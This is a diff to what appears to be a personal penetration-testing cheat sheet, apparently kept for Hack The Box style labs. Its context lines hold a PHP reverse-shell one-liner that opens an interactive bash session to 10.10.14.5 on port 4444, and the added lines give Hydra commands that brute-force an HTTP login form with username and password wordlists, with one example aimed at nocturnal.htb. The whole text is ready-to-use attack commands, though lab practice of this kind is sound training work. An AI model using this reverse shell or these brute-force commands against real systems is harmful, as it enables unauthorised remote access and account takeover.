@@ -8,3 +8,11 @@ Switch to a interractive shell:
 Reverse shell script:
     <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"); ?>
 
+Hydra command:
+    Syntax:
+        hydra -L usernames.txt -P passwords.txt target.com http-post-form "/        login.php:user=^USER^&pass=^PASS^:F=Incorrect"
+    
+    Example:
+        hydra -L /home/thulana/Desktop/Wordlists/usernames.txt -P /home/thulana/Desktop/Wordlists/passlist.txt nocturnal.htb http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
+
+
